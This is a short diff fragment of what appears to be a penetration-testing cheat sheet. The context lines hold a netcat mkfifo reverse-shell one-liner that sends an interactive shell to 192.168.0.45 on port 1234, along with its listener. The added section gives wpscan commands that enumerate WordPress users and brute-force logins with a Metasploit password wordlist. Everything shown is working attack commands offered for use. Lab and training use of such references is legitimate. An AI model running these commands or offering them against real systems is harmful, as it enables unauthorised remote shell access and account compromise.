@@ -356,7 +356,13 @@ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.45 1234 >/tmp
 sudo nc -lvp 1234
 ```
 
+## wpscan
 
+```bash
+wpscan --url http://wordpress.local -e u --wp-content-dir wp-content
+
+wpscan --url http://wordpress.local --passwords /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
 
 
 
